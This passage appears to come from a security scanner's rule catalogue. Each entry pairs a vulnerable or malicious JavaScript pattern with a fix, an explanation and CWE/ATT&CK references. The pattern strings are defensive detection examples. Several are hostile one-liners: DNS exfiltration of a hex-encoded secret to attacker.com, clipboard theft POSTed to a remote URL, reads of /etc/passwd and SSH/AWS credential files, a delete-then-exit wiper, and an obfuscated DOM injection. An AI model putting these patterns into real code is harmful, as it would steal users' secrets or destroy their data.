  "SENSITIVE_FILE_ACCESS": {
    pattern: "fs.readFileSync('/etc/passwd'); // or ~/.ssh/id_rsa, .aws/credentials",
    fix: "// Remove reads of system credential files from application code.\n// To load your own config, use a scoped, project-relative path:\nrequire('dotenv').config({ path: path.resolve(process.cwd(), '.env') });",
    explanation: "Reading /etc/passwd, ~/.ssh/id_rsa, or .aws/credentials from app code is almost always credential theft or reconnaissance (ATT&CK T1552). Remove it; legitimate config loading should use a safe library scoped to a project-relative path.",
    references: ["CWE-552", "MITRE ATT&CK T1552", "OWASP Top 10 A08:2021"]
  },
  "EXIT_WITH_DESTRUCTION": {
    pattern: "fs.rmSync(dir, { recursive: true }); process.exit(0); // wiper / anti-forensics",
    fix: "// Remove exit-triggered deletion. Do resource cleanup in a finally block, not\n// tied to process exit, and never combine deletion with process.exit():\ntry { /* work */ } finally { await releaseHandles(); }",
    explanation: "Combining filesystem deletion with process.exit() is a wiper/anti-forensics pattern that erases data or logs then terminates (ATT&CK T1485/T1070). Remove it; legitimate cleanup belongs in finally blocks, never triggered by exit.",
    references: ["CWE-73", "MITRE ATT&CK T1485", "MITRE ATT&CK T1070"]
  },
  "HIDDEN_FILE_WRITE": {
    pattern: "fs.writeFileSync(path.join(os.homedir(), '.update'), payload); // hidden dotfile",
    fix: "// Write operational files to a documented, non-hidden project path:\nfs.writeFileSync(path.join(DATA_DIR, 'state.json'), payload);\n// Review any write to a hidden dotfile — it is a common persistence technique.",
    explanation: "Writing to non-standard hidden dotfiles is a concealment/persistence technique used by malware (ATT&CK T1564.001). Use documented non-hidden paths for operational data and review any hidden-file write for legitimacy.",
    references: ["CWE-552", "MITRE ATT&CK T1564.001", "OWASP Top 10 A08:2021"]
  },
  "DNS_EXFILTRATION": {
    pattern: "dns.resolve(Buffer.from(process.env.SECRET).toString('hex') + '.attacker.com');",
    fix: "// Remove derived-hostname DNS lookups. DNS names must be static, hardcoded\n// constants — never built from secrets, env vars, or user data:\ndns.resolve('api.example.com');",
    explanation: "Building a DNS hostname from an encoded secret or env var is a covert exfiltration channel that bypasses HTTP egress controls (ATT&CK T1048.003). Remove it; DNS lookups should use static hostnames only.",
    references: ["CWE-200", "MITRE ATT&CK T1048.003", "OWASP Top 10 A08:2021"]
  },
  "CLIPBOARD_EXFILTRATION": {
    pattern: "navigator.clipboard.readText().then(t => fetch('https://x/c', { method:'POST', body:t }));",
    fix: "// Remove clipboard-read-plus-send. Legitimate copy/paste UX writes to the\n// clipboard on user action and never transmits its contents to a server:\nawait navigator.clipboard.writeText(shareUrl);",
    explanation: "Reading clipboard contents and sending them to a remote URL is a password/credential skimmer targeting password managers (ATT&CK T1115). Remove it; legitimate clipboard use never exfiltrates clipboard data.",
    references: ["CWE-200", "MITRE ATT&CK T1115", "OWASP Top 10 A08:2021"]
  },
  "OBFUSCATED_DOM_INJECTION": {
    pattern: "el.innerHTML = atob('PHNjcmlwdD4...'); // base64/hex/charCode-assembled payload into DOM",
    fix: "// Remove encoded DOM injection. Insert only static or sanitized content:\nel.textContent = userText; // text, not HTML\n// if HTML is required: el.innerHTML = DOMPurify.sanitize(html);",
    explanation: "Assembling an obfuscated (base64/hex/char-code) payload and injecting it into the DOM is a web-skimmer technique that hides malicious script from scanners and CSP review (ATT&CK T1027). Never build DOM content from encoded strings; render text or DOMPurify-sanitized HTML.",
    references: ["CWE-79", "MITRE ATT&CK T1027", "OWASP Top 10 A03:2021"]
  },

  // ---------------------------------------------------------------------------
  // Dependency / lockfile / registry hygiene
  // ---------------------------------------------------------------------------
  "DEPENDENCY_CONFUSION_RISK": {
    pattern: "// package.json uses @yourscope/* but .npmrc has no registry mapping for @yourscope",
    fix: "// .npmrc\n@yourscope:registry=https://your-private-registry.example.com\n//your-private-registry.example.com/:_authToken=${NPM_TOKEN}",
    explanation: "A scoped package with no private-registry mapping in .npmrc resolves from public npm, so an attacker publishing a higher version under your scope name gets installed (dependency confusion, ATT&CK T1195.002). Map every internal scope to your private registry in .npmrc.",
    references: ["CWE-427", "MITRE ATT&CK T1195.002", "OWASP Top 10 A06:2021"]
  },
  "DEPENDENCY_MALICIOUS_SCRIPT": {
    pattern: "// a transitive dep's lifecycle script matches download-and-execute / inline eval / base64 decode",
    fix: "// Remove or replace the offending transitive dependency. Rebuild from a clean,\n// trusted lockfile, install with `npm ci --ignore-scripts`, and rotate every\n// secret the dev/CI environment could have exposed.",
    explanation: "A transitive dependency whose lifecycle script matches known malicious patterns runs automatically on every install (CWE-494 / ATT&CK T1195.002). Remove the package, treat the environment as compromised, rotate secrets, and reinstall with scripts disabled.",
    references: ["CWE-494", "MITRE ATT&CK T1195.002", "OWASP Top 10 A08:2021"]
  },
  "UNPINNED_DEPENDENCY_VERSION": {
    pattern: "\"lodash\": \"latest\" // or \"*\" / open range — floating version",
    fix: "\"lodash\": \"4.17.21\" // exact pin + committed lockfile; install with `npm ci`",
    explanation: "Floating version ranges (*, latest, open ranges) let a malicious release auto-install on the next npm install (the event-stream vector, CWE-1357). Pin exact versions, commit the lockfile, and enable automated vulnerability alerts.",
    references: ["CWE-1357", "MITRE ATT&CK T1195.002", "SLSA L1"]
  },
  "WILDCARD_DEPENDENCY_VERSION": {
    pattern: "\"express\": \"*\" // or \"latest\" in package.json",
    fix: "\"express\": \"4.19.2\" // exact semver, commit package-lock.json, run `npm ci`",
    explanation: "A '*'/'latest' dependency version allows a malicious package release to install on the next 'npm install' (CWE-1357). Pin an exact semver, commit the lockfile, and enable Dependabot/Socket.dev alerts.",
    references: ["CWE-1357", "MITRE ATT&CK T1195.002", "SLSA L1"]
  },
  "INSTALL_INTEGRITY_BYPASS": {
    pattern: "npm install --no-package-lock --no-verify   # or ignore-scripts=false / http registry",
    fix: "npm ci                       # installs from the committed lockfile, verifies integrity\n// .npmrc: ignore-scripts=true; registry=https://registry.npmjs.org",
    explanation: "Flags/config that disable lockfiles, checksum verification, or re-enable lifecycle scripts turn off supply-chain safeguards at install time (CWE-494). Use `npm ci` with a committed lockfile, keep ignore-scripts=true, pin the official HTTPS registry, and enforce it in CI.",
    references: ["CWE-494", "MITRE ATT&CK T1195", "SLSA L2"]
  },
  "NPMRC_UNTRUSTED_REGISTRY": {
    pattern: "registry=http://packages.internal/  # non-HTTPS / non-official",
    fix: "registry=https://registry.npmjs.org   # or your private Artifactory/Nexus over HTTPS",
    explanation: "An HTTP or unofficial registry lets a network MITM serve malicious packages, and misconfigured private scopes enable dependency confusion (CWE-494). Point the registry at the official HTTPS npm registry or an authenticated private mirror over TLS.",
    references: ["CWE-494", "MITRE ATT&CK T1195.002", "OWASP Top 10 A06:2021"]
  },
  "PIP_NO_HASH_CHECKING": {
    pattern: "pip install -r requirements.txt   # no --require-hashes",
    fix: "pip install --require-hashes -r requirements.txt\n# generate with: pip-compile --generate-hashes  (pip-tools)",
    explanation: "Without --require-hashes, a compromised PyPI mirror or index-url can substitute a backdoored package (ATT&CK T1195.001). Generate hashed requirements with pip-compile --generate-hashes and install with --require-hashes.",
    references: ["CWE-494", "MITRE ATT&CK T1195.001", "SLSA L2"]
  },
  "PIP_CONF_UNTRUSTED_REGISTRY": {
    pattern: "# pip.conf\nindex-url = https://mirror.untrusted/simple   # or always-auth=true in .npmrc",
    fix: "# pip.conf\nindex-url = https://pypi.org/simple\n# .npmrc: remove always-auth=true so credentials aren't sent to every registry",
    explanation: "A non-official pip index leaks credentials and risks package substitution, and always-auth=true in .npmrc sends tokens to every registry URL including attacker mirrors. Restrict indexes to pypi.org / a controlled HTTPS mirror and remove always-auth.",
    references: ["CWE-522", "MITRE ATT&CK T1195.001", "OWASP Top 10 A06:2021"]
  },
  "GO_SUM_MISSING": {
    pattern: "// go.mod present with no go.sum committed",
    fix: "go mod tidy   # generates go.sum\ngit add go.sum && git commit -m 'chore: add go.sum'",
    explanation: "Without go.sum the Go toolchain cannot verify cryptographic hashes of downloaded modules, so a compromised proxy can serve any content (ATT&CK T1195.001). Run `go mod tidy` and commit go.sum alongside go.mod.",
    references: ["CWE-353", "MITRE ATT&CK T1195.001", "SLSA L2"]
  },
  "LOCKFILE_OUT_OF_SYNC": {
    pattern: "// package.json declares deps not present in package-lock.json",
    fix: "npm install   # regenerate and sync package-lock.json\ngit add package-lock.json && git commit -m 'chore: sync lockfile'\n// use `npm ci` in CI — it fails on drift",
    explanation: "A package-lock.json out of sync with package.json means installed versions aren't pinned and reviewed, weakening reproducibility and supply-chain integrity (ATT&CK T1195.001). Regenerate and commit the lockfile, and use `npm ci` in CI so drift fails the build.",
    references: ["CWE-353", "MITRE ATT&CK T1195.001", "SLSA L1"]
  },
  "GITHUB_ACTIONS_MUTABLE_REF": {
    pattern: "- uses: actions/checkout@v4   # mutable tag/branch",
    fix: "- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2 pinned SHA",
    explanation: "A GitHub Action pinned to a mutable tag/branch can be repointed to malicious code by an upstream compromise (tj-actions/changed-files, CWE-1357). Pin every third-party action to a full commit SHA and automate it with pin-github-action or Dependabot.",
    references: ["CWE-1357", "MITRE ATT&CK T1195.002", "SLSA L3"]
  },
  "SUPPLY_CHAIN_SCORECARD_PARTIAL": {
    pattern: "// OpenSSF Scorecard evaluated only a subset of total dependencies",
    fix: "npx ossf-scorecard --repo=github.com/org/repo   # full run\n// add continuous SCA monitoring (Socket.dev / Snyk) across all deps",
    explanation: "Partial OpenSSF Scorecard coverage leaves some dependencies un-assessed for supply-chain risk. Run Scorecard across the full dependency set and add continuous monitoring (Socket.dev/Snyk) so new dependencies are scored automatically.",
    references: ["CWE-1104", "OWASP Top 10 A06:2021", "SLSA L2"]
  },
  "PACKAGE_JSON_EMPTY": {
    pattern: "// package.json has no dependencies or devDependencies block",
    fix: "// Declare dependencies explicitly and commit a lockfile so builds are\n// reproducible and auditable:\n// { \"dependencies\": { \"express\": \"4.19.2\" } } + package-lock.json",
    explanation: "A package.json with no declared dependencies gives supply-chain tooling nothing to audit and often indicates missing manifest data. Declare direct dependencies explicitly with pinned versions and commit the lockfile.",
    references: ["CWE-1104", "OWASP Top 10 A06:2021", "SLSA L1"]
  },
  "PACKAGE_JSON_INVALID": {
    pattern: "// package.json is missing or contains invalid JSON",
    fix: "// Restore a valid, parseable package.json and validate it in CI:\nnode -e \"JSON.parse(require('fs').readFileSync('package.json','utf8'))\"\nnpm pkg fix",
    explanation: "A missing or malformed package.json breaks dependency resolution, lockfile integrity, and every supply-chain check that depends on the manifest. Restore valid JSON, run `npm pkg fix`, and validate the manifest parses in CI.",
    references: ["CWE-1104", "OWASP Top 10 A06:2021", "SLSA L1"]
  },
  "PROVENANCE_MISSING": {
    pattern: "// CI build produces artifacts with no SLSA provenance attestation",
    fix: "# GitHub Actions: emit build provenance\n- uses: slsa-framework/slsa-github-generator@v2.0.0\n# store the .intoto.jsonl attestation in .mcp/attestations/ and verify on deploy",
    explanation: "Without SLSA provenance, consumers cannot verify who built an artifact or from which source, so a tampered build is undetectable. Generate .intoto.jsonl provenance during CI (slsa-github-generator), store it, and verify it before deployment.",
    references: ["CWE-345", "SLSA L3", "NIST 800-218 PS-3"]
  },

  // ---------------------------------------------------------------------------
  // Auth / session / tokens
  // ---------------------------------------------------------------------------
  "ADMIN_ROUTE_NO_AUTHZ": {
    pattern: "router.get('/admin/users', listUsers); // no authorization middleware",
    fix: "router.use('/admin', requireAuth, requireRole('admin')); // BEFORE the handlers\nrouter.get('/admin/users', listUsers);",
    explanation: "An /admin or /internal route with no authorization middleware is reachable by any authenticated (or anonymous) user — broken function-level authorization (CWE-862). Apply an admin-role check as middleware registered before the route handlers.",
    references: ["CWE-862", "OWASP Top 10 A01:2021", "OWASP API Security API5:2023"]
  },
  "AUTH_EVENTS_NOT_LOGGED": {
    pattern: "if (!valid) return res.status(401).end(); // failure not logged",
    fix: "if (!valid) {\n  logger.warn({ userId, ip: req.ip }, 'Authentication failed — invalid credentials');\n  return res.status(401).end();\n}",
    explanation: "Auth endpoints without structured logging of failures and denials prevent detection of credential stuffing and brute-force (OWASP A09). Emit structured logger.warn/error events for authentication failures, authorization denials, and anomalous requests, and forward them to a SIEM.",
    references: ["CWE-778", "OWASP Top 10 A09:2021", "NIST 800-53 AU-2"]
  },
  "SESSION_FIXATION_MULTILINE": {
    pattern: "// login handler assigns req.session.userId = user.id with no nearby regenerate()",
    fix: "req.session.regenerate((err) => {\n  if (err) return next(err);\n  req.session.userId = user.id; // fresh session id after auth\n});",
    explanation: "Assigning session identity without regenerating the session id lets an attacker who planted a known pre-login id ride the authenticated session (CWE-384). Call req.session.regenerate() (or the framework equivalent) immediately before assigning identity.",
    references: ["CWE-384", "OWASP Top 10 A07:2021", "OWASP Session Management Cheat Sheet"]
  },
  "TOKEN_MISSING_EXPIRY": {
    pattern: "await db.apiTokens.create({ userId, token }); // no expiry field",
    fix: "await db.apiTokens.create({ userId, token, expiresAt: new Date(Date.now() + 90*86400000) });\n// reject on use when Date.now() > expiresAt",
    explanation: "API tokens created without an expiry stay valid indefinitely after a leak, maximizing breach impact (CWE-613). Set an expiresAt/expiresIn on creation and enforce it on every use, rotating tokens on a schedule.",
    references: ["CWE-613", "OWASP Top 10 A07:2021", "OWASP API Security API2:2023"]
  },
  "REFRESH_TOKEN_NOT_ROTATED": {
    pattern: "const newAccess = issueAccessToken(user); // old refresh token still valid",
    fix: "await db.refreshTokens.delete({ token: oldRefresh }); // revoke first\nconst newRefresh = issueRefreshToken(user); // rotate on every use; detect reuse",
    explanation: "Issuing a new refresh token without revoking the old one leaves a stolen refresh token valid indefinitely (CWE-613). Rotate refresh tokens on every use — invalidate the presented token, issue a fresh one, and treat reuse of a revoked token as compromise.",
    references: ["CWE-613", "OAuth 2.0 Security BCP (RFC 9700)", "OWASP Top 10 A07:2021"]
  },
  "REMEMBER_ME_NO_ROTATION": {
    pattern: "// persistent remember-me token validated on each visit, never rotated",
    fix: "await db.rememberTokens.delete({ token: presented });\nconst next = crypto.randomBytes(32).toString('hex');\nawait db.rememberTokens.create({ userId, token: next, expiresAt });",
    explanation: "A persistent remember-me token that is never rotated grants indefinite access if stolen (CWE-613). Rotate it on each use (invalidate the presented token, issue a fresh CSPRNG token with an expiry) so theft is time-bounded and detectable.",
    references: ["CWE-613", "OWASP Top 10 A07:2021", "OWASP Session Management Cheat Sheet"]
  },
  "COOKIE_MISSING_SECURE_FLAGS": {
    pattern: "res.cookie('session', token); // no httpOnly / secure / sameSite",
    fix: "res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'Strict', maxAge: 3600000 });",
    explanation: "A session cookie without httpOnly is stealable via XSS, without secure is sent over HTTP, and without SameSite is exposed to CSRF (CWE-1004/CWE-614). Set httpOnly, secure, and sameSite on all auth/session cookies.",
    references: ["CWE-1004", "CWE-614", "OWASP Top 10 A05:2021"]
  },
  "SESSION_TOKEN_IN_URL": {
    pattern: "const sid = req.query.session_id; // token passed in URL query string",
    fix: "const sid = req.cookies['session']; // cookie, or the Authorization header — never the URL",
    explanation: "Session tokens in query parameters are logged in server access logs, browser history, Referer headers, and CDN logs in plaintext (CWE-598). Carry session tokens only in cookies or the Authorization header.",
    references: ["CWE-598", "OWASP Top 10 A07:2021", "OWASP Session Management Cheat Sheet"]
  },
  "TOKEN_ENTROPY_TOO_LOW": {
    pattern: "const token = crypto.randomBytes(8).toString('hex'); // 64-bit, brute-forceable",
    fix: "const token = crypto.randomBytes(32).toString('hex'); // 256-bit entropy",
    explanation: "Tokens generated with fewer than 128 bits of entropy are brute-forceable/enumerable (CWE-331). Use crypto.randomBytes(32) or larger so tokens carry at least 256 bits of entropy.",
    references: ["CWE-331", "OWASP Top 10 A02:2021", "OWASP ASVS 2.9"]
  },
  "PREDICTABLE_SESSION_ID": {
    pattern: "const sessionId = Date.now().toString() + counter++; // or Math.random()",
    fix: "const sessionId = crypto.randomBytes(32).toString('hex'); // or crypto.randomUUID()",
    explanation: "Session/token identifiers derived from Math.random, Date.now, or a sequential counter are predictable, letting an attacker guess or enumerate valid sessions and hijack them (CWE-330/CWE-340). Generate identifiers with a CSPRNG.",
    references: ["CWE-330", "CWE-340", "OWASP Top 10 A02:2021"]
  },
  "TIMING_ORACLE_COMPARISON": {
    pattern: "if (provided === storedToken) grant(); // or OTP/PIN/API-key compared with ===",
    fix: "const a = Buffer.from(provided), b = Buffer.from(storedToken);\nif (a.length === b.length && crypto.timingSafeEqual(a, b)) grant();",
    explanation: "Comparing a secret (token/OTP/PIN/API key) with === short-circuits on the first differing byte, leaking length and content through response timing (CWE-208). Use crypto.timingSafeEqual() with an equal-length check for all secret comparisons.",
    references: ["CWE-208", "OWASP Top 10 A02:2021", "MITRE ATT&CK T1110"]
  },
  "OIDC_NONCE_NOT_VALIDATED": {
    pattern: "// nonce sent to the IdP but the id_token nonce claim is never checked",
    fix: "// before redirect: req.session.oidcNonce = nonce;\n// after token exchange:\nif (idToken.nonce !== req.session.oidcNonce) throw new Error('Invalid nonce');",
    explanation: "Sending an OIDC nonce but never comparing it to the id_token's nonce claim allows token replay/injection from a different session (OIDC Core §3.1.2.7). Store the nonce in the session before redirect and reject any id_token whose nonce doesn't match.",
    references: ["CWE-287", "OpenID Connect Core 1.0 §3.1.2.7", "OWASP Top 10 A07:2021"]
  },
  "OIDC_DISCOVERY_UNPINNED": {
    pattern: "const issuer = await Issuer.discover(discoveryUrl); // issuer not verified",
    fix: "const issuer = await Issuer.discover(process.env.OIDC_ISSUER!); // TLS-verified fetch\nif (issuer.issuer !== EXPECTED_ISSUER) throw new Error('Untrusted issuer');",
    explanation: "Fetching an OIDC discovery document without pinning/verifying the issuer lets an attacker who influences the URL or MITMs the fetch control jwks_uri and the token endpoints, enabling full token forgery (CWE-295/CWE-346). Pin the expected issuer, verify it, and fetch only over verified TLS.",
    references: ["CWE-295", "CWE-346", "OpenID Connect Discovery 1.0"]
  },
  "CSRF_MAY_BE_MISSING": {
    pattern: "app.post('/transfer', transferHandler); // no CSRF token or origin check",
    fix: "import csrf from 'csurf';\napp.use(csrf({ cookie: { httpOnly: true, sameSite: 'lax', secure: true } }));\n// verify token on state-changing routes; also validate Origin/Referer",
    explanation: "State-changing endpoints without CSRF protection let a malicious site submit authenticated requests using the victim's cookies. Use SameSite cookies plus per-request CSRF tokens (double-submit or synchronizer pattern) and validate Origin/Referer for browser contexts.",
    references: ["CWE-352", "OWASP Top 10 A01:2021", "OWASP CSRF Prevention Cheat Sheet"]
  },
  "IDOR_RISK_REVIEW": {
    pattern: "app.get('/orders/:id', (req,res) => res.json(getOrder(req.params.id))); // no owner check",
    fix: "const order = await db.order.findFirst({ where: { id: req.params.id, userId: req.auth.userId } });\nif (!order) return res.status(404).end(); // enforce ownership server-side",
    explanation: "Parameterized resource access without a server-side authorization check risks IDOR — a user can read/modify another user's records. Scope every resource query to the authenticated principal (UI checks never count) and add cross-tenant access tests.",
    references: ["CWE-639", "OWASP Top 10 A01:2021", "OWASP API Security API1:2023"]
  },

  // ---------------------------------------------------------------------------
  // Business logic — IDOR / race / money / state machine
  // ---------------------------------------------------------------------------
  "IDOR_MULTI_LINE": {
    pattern: "const id = args.id;\n/* ...several lines... */\nconst doc = await db.doc.findUnique({ where: { id } }); // no ownership check",
    fix: "const doc = await db.doc.findUnique({ where: { id: args.id, userId: ctx.user.id } });\nif (!doc) return null; // ownership enforced in the query",
    explanation: "When a user-supplied id is captured early and used in a DB lookup several lines later without an intervening ownership check, it's a multi-line IDOR (CWE-639). Include the owner in the where clause or verify ownership after fetch.",
    references: ["CWE-639", "OWASP Top 10 A01:2021", "OWASP API Security API1:2023"]
  },
  "NEGATIVE_AMOUNT_BYPASS": {
    pattern: "const amount = Number(req.body.amount); account.balance -= amount; // amount may be negative",
    fix: "const amount = z.number().positive().parse(req.body.amount); // reject <= 0",
    explanation: "Financial amounts from user input that aren't validated as positive let a negative value credit an account, refund without purchase, or reverse a debit (CWE-20). Validate that amounts are strictly positive before processing any transaction.",
    references: ["CWE-20", "OWASP Top 10 A04:2021", "OWASP API Security API6:2023"]
  },
  "RACE_CONDITION_BALANCE": {
    pattern: "const bal = await getBalance(id); if (bal >= amt) await setBalance(id, bal - amt); // read-then-write",
    fix: "await db.$transaction([\n  db.account.update({ where: { id, balance: { gte: amt } }, data: { balance: { decrement: amt } } })\n]); // atomic conditional decrement",
    explanation: "Reading a balance/quota then writing it back non-atomically lets two concurrent requests both pass the check and overdraft/oversell (CWE-362). Use an atomic conditional update ($inc/decrement with a gte guard) or SELECT ... FOR UPDATE in a transaction.",
    references: ["CWE-362", "OWASP Top 10 A04:2021", "OWASP Race Condition"]
  },
  "RACE_CONDITION_TOCTOU": {
    pattern: "const r = await tx.findUnique(...); if (r.ok) await tx.update(...); // multi-line read-then-write",
    fix: "await db.$transaction(async (tx) => {\n  const r = await tx.account.findUnique({ where: { id } }); // SELECT ... FOR UPDATE\n  await tx.account.update({ where: { id }, data: { /* based on r */ } });\n});",
    explanation: "A multi-line read-then-write without SELECT FOR UPDATE, a transaction, or a mutex is a TOCTOU race — two requests read the same state and both write based on stale data (CWE-362). Wrap the sequence in a transaction with row locking.",
    references: ["CWE-362", "OWASP Top 10 A04:2021", "OWASP Race Condition"]
  },
  "FILESYSTEM_TOCTOU": {
    pattern: "if (fs.existsSync(p)) fs.writeFileSync(p, data); // check-then-act",
    fix: "const fd = fs.openSync(p, 'wx'); // atomically create-or-fail; O_EXCL\ntry { fs.writeSync(fd, data); } finally { fs.closeSync(fd); }",
    explanation: "An fs.access/fs.stat check followed by fs.write/fs.unlink is a filesystem TOCTOU — another process can swap or replace the file in between (CWE-362). Use atomic operations (open with the 'wx'/O_EXCL flag) or advisory file locking instead of check-then-act.",
    references: ["CWE-362", "CWE-367", "OWASP Race Condition"]
  },
  "UNRESTRICTED_SENSITIVE_ENDPOINT": {
    pattern: "router.get('/export', exportAllUsers); // no auth on export/download/backup",
    fix: "router.get('/export', requireAuth, requireRole('admin'), exportAllUsers);",
    explanation: "A data export/download/backup endpoint registered without authentication lets any internet user download entire databases (CWE-284). Apply authentication and role-based authorization middleware to every sensitive-data endpoint.",
    references: ["CWE-284", "OWASP Top 10 A01:2021", "OWASP API Security API5:2023"]
  },
  "INTEGER_OVERFLOW_RISK": {
    pattern: "const qty = parseInt(req.body.quantity); const total = qty * price; // no bounds check",
    fix: "const qty = z.number().int().min(1).max(10000).parse(Number(req.body.quantity));\nconst total = qty * price;",
    explanation: "Using a parsed integer from user input in arithmetic without bounds checking can cause incorrect calculations, allocation failures, or logic bypass via extreme values (CWE-190). Validate the integer is within safe minimum/maximum bounds before use.",
    references: ["CWE-190", "OWASP Top 10 A04:2021", "OWASP ASVS 5.4"]
  },
  "MONETARY_FLOAT_ARITHMETIC": {
    pattern: "const total = price * 1.0825; // floating-point money → rounding drift",
    fix: "const cents = Math.round(price * 100);\nconst total = Math.round(cents * 1.0825); // integer cents\n// or: import Decimal from 'decimal.js'; new Decimal(price).times(1.0825)",
    explanation: "Floating-point arithmetic on monetary values accumulates rounding errors that under- or over-charge at scale (CWE-681). Work in integer cents (multiply, compute, divide at display) or use a decimal library.",
    references: ["CWE-681", "OWASP Top 10 A04:2021", "IEEE 754"]
  },
  "VOUCHER_REPLAY_RISK": {
    pattern: "if (voucher.valid) applyDiscount(userId, voucher); // no idempotency / uniqueness",
    fix: "await db.redemption.create({ data: { code, userId } }); // UNIQUE(code, userId) rejects reuse\napplyDiscount(userId, voucher);",
    explanation: "Voucher/coupon redemption without an idempotency or uniqueness check is replayable, letting one code be reused unlimited times (CWE-384). Record each redemption behind a UNIQUE(code, userId) constraint so duplicates are rejected atomically.",
    references: ["CWE-384", "OWASP Top 10 A04:2021", "OWASP API Security API6:2023"]
  },
  "STATE_MACHINE_BYPASS_RISK": {
    pattern: "app.post('/checkout/confirm', confirm); // does not verify payment step done",
    fix: "if (!req.session.paymentComplete) return res.status(400).json({ error: 'Complete payment first' });\nawait confirm(req);",
    explanation: "A multi-step flow endpoint that doesn't verify prior-step completion lets an attacker skip payment, identity verification, or terms acceptance (CWE-841). Enforce that each step checks the preceding steps' server-side state before proceeding.",
    references: ["CWE-841", "OWASP Top 10 A04:2021", "OWASP Business Logic Testing"]
  },

  // ---------------------------------------------------------------------------
  // Crypto / TLS / secrets
  // ---------------------------------------------------------------------------
  "WEAK_CRYPTO_HASH": {
    pattern: "crypto.createHash('md5').update(data).digest('hex'); // or 'sha1'",
    fix: "crypto.createHash('sha256').update(data).digest('hex'); // integrity\n// passwords: await argon2.hash(pw); symmetric: aes-256-gcm",
    explanation: "MD5 and SHA-1 are cryptographically broken — practical collisions exist (Shattered, SLOTH) — so using them for integrity, HMAC, or signatures allows forgery (CWE-327). Use SHA-256+ for integrity, Argon2id/scrypt for passwords, and AES-256-GCM for symmetric encryption.",
    references: ["CWE-327", "NIST SP 800-131A Rev 2", "OWASP Top 10 A02:2021"]
  },
  "TLS_WEAK_MIN_VERSION": {
    pattern: "https.createServer({ minVersion: 'TLSv1' }, app); // TLS 1.0/1.1 or SSL",
    fix: "https.createServer({ minVersion: 'TLSv1.2' }, app); // or 'TLSv1.3'",
    explanation: "TLS 1.0/1.1 and SSL are deprecated (RFC 8996) and prohibited by PCI DSS 4.0 due to known weaknesses. Set minVersion to 'TLSv1.2' or 'TLSv1.3' on all TLS/HTTPS servers and clients.",
    references: ["CWE-326", "RFC 8996", "PCI DSS 4.0 Req 4.2.1"]
  },
  "TLS_REJECT_UNAUTHORIZED_DISABLED": {
    pattern: "https.request({ rejectUnauthorized: false }); // disables cert verification",
    fix: "https.request({ minVersion: 'TLSv1.2' }); // verification stays on (default)\n// self-signed cert? add it: https.request({ ca: fs.readFileSync('internal-ca.pem') })",
    explanation: "Disabling certificate verification lets any MITM present a forged certificate and intercept traffic (CWE-295). Keep verification enabled and, for a private/self-signed CA, supply it via the `ca` option rather than turning verification off.",
    references: ["CWE-295", "OWASP Top 10 A02:2021", "NIST 800-52 Rev 2"]
  },
  "ENCODED_SECRET": {
    pattern: "const key = Buffer.from('c2stbGl2ZS1BQkNE...', 'base64').toString(); // base64-hidden secret",
    fix: "const key = process.env['API_KEY']; // from a secret manager\n// rotate the exposed credential and delete the encoded literal from history",
    explanation: "Encoding (base64/hex) is not encryption — an encoded secret in source is still a secret and is trivially recovered (CWE-798). Rotate the exposed credential, remove the encoded literal, and load secrets from environment variables backed by a secret manager.",
    references: ["CWE-798", "OWASP Top 10 A07:2021", "NIST 800-53 IA-5"]
  },
  "GITLEAKS_NOT_IN_PATH": {
    pattern: "// gitleaks binary not installed — git history was not scanned for secrets",
    fix: "brew install gitleaks   # or download from github.com/gitleaks/gitleaks\ngitleaks detect --source . --log-opts='--all'   # scan full history in CI",
    explanation: "Without gitleaks the commit history isn't scanned, so secrets committed in the past and later removed remain exposed. Install gitleaks and run `gitleaks detect --log-opts='--all'` in CI to cover full history.",
    references: ["CWE-540", "OWASP Top 10 A07:2021", "NIST 800-53 IA-5"]
  },
  "GIT_HISTORY_SECRET": {
    pattern: "// a secret is present in a prior commit even if removed from the working tree",
    fix: "// 1) Rotate every exposed credential immediately.\n// 2) Purge from history: git filter-repo --invert-paths --path <file>  (or BFG)\n// 3) Force-push and have all collaborators re-clone; enable secret scanning.",
    explanation: "A secret in git history stays exposed to anyone with repo access even after it's deleted from the working tree (CWE-540). Rotate the credential first, then purge it with git-filter-repo/BFG, force-push, and enable remote secret-scanning + branch protection.",
    references: ["CWE-540", "OWASP Top 10 A07:2021", "NIST 800-53 IA-5"]
  },

  // ---------------------------------------------------------------------------
  // SSRF / infra / IaC
  // ---------------------------------------------------------------------------
  "SSRF_GUARD_REQUIRED": {
    pattern: "const r = await fetch(userProvidedUrl); // server-side fetch, no SSRF guard",
    fix: "const target = new URL(userProvidedUrl);\nif (!ALLOWED_HOSTS.has(target.hostname) || isPrivateIp(target.hostname)) throw new Error('blocked');\nawait fetch(target, { redirect: 'manual' }); // block localhost/10.0.0.0/8/172.16/12/192.168/16/169.254.169.254/metadata.google.internal",
    explanation: "A server-side fetch to a user-influenced URL can reach internal services and cloud metadata (169.254.169.254, metadata.google.internal), leaking credentials (CWE-918). Enforce a host allowlist, block localhost/private/link-local ranges, disable auto-redirects, and add tests for those hosts.",
    references: ["CWE-918", "OWASP Top 10 A10:2021", "OWASP API Security API7:2023"]
  },
  "IAM_OVERPRIVILEGED": {
    pattern: "{ \"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" } // or Owner/Editor binding",
    fix: "{ \"Effect\": \"Allow\", \"Action\": [\"s3:GetObject\"], \"Resource\": \"arn:aws:s3:::app-bucket/*\" }\n// replace Owner/Editor with a purpose-scoped custom role",
    explanation: "Wildcard actions/resources and broad Owner/Editor/Contributor bindings grant far more than needed, widening the blast radius of any compromise (CWE-269). Apply least privilege — enumerate only required actions/resources — and use IAM Access Analyzer to prune unused permissions.",
    references: ["CWE-269", "NIST 800-53 AC-6", "CIS AWS Foundations Benchmark"]
  },
  "PUBLIC_EXPOSURE_RISK": {
    pattern: "resource \"aws_security_group_rule\" { cidr_blocks = [\"0.0.0.0/0\"] } // open to internet",
    fix: "cidr_blocks = [\"10.0.0.0/8\"] // restrict to known CIDRs / private subnets\n// enable S3 Block Public Access account-wide; front internal services with a bastion/ZTNA",
    explanation: "Exposing a resource to 0.0.0.0/0 or a public endpoint puts internal services directly on the internet (CWE-284). Restrict ingress to known CIDRs or private subnets, enable S3 Block Public Access, and prefer Zero Trust access over broad IP allowlisting.",
    references: ["CWE-284", "NIST 800-53 SC-7", "CIS AWS Foundations Benchmark"]
  },
  "ENCRYPTION_DISABLED": {
    pattern: "resource \"aws_db_instance\" \"db\" { storage_encrypted = false }",
